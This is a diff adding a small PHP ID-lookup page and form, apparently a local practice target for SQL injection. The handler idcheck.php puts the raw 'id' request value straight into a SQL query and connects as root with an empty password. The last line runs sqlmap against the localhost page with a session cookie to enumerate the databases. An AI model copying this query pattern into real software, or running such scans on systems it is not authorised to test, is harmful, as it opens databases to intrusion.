@@ -1,0 +1,54 @@
+index.php----------------------------------------------
+
+<html>
+
+    <head>
+        <title>
+
+        </title>
+
+    <body>
+        <form action="idcheck.php" method="get">
+            check id<input type="text" name="id">
+            <input type="submit" value="submit" name="submit">
+
+        </form>
+    </body>
+    </head>
+
+</html>
+
+
+
+idcheck.php----------------------------------------------
+
+<?php
+$conn = mysqli_connect("localhost", "root", "", "abc");
+$id = $_REQUEST['id'];
+$sql = "select id from users where id='$id'";
+$result = mysqli_query($conn, $sql);
+$res = mysqli_fetch_assoc($result);
+if (isset($res))
+{
+    echo "id exist....";
+}
+else
+{
+    echo "id not found...";
+}
+$cookie_name = "id";
+$cookie_value = $id;
+setcookie($cookie_name, $cookie_value, time() + (86400 * 30), "/"); // 86400 = 1 day
+
+session_start();
+$_SESSION["sessionid"] = $id;
+print_r($_SESSION);
+
+
+
+
+?>
+
+
+
+sqlmap.py -u "http://localhost/databasecreack/idcheck.php?id=1&submit=submit" --cookie="security=low; PHPSESSID=o1tjikadp5v1tvfc07131bep8d" --dbs
